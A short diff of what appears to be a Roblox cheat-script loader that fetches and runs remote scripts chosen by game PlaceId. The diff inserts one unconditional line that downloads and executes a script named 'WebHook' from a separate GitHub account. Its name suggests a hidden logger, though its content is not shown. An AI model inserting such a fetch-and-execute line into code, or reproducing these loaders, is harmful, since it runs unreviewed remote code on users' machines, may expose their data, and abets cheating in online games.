@@ -7,6 +7,7 @@ Duration = 5;
 if not game:IsLoaded() then
     repeat wait() until game:IsLoaded()
 end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NoobieDev2009/s3423514/main/WebHook'))()
 if game.PlaceId == 9500891570 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BlackFox1K/games/main/Admin%20Guns"))()
 elseif game.PlaceId == 2788229376 then
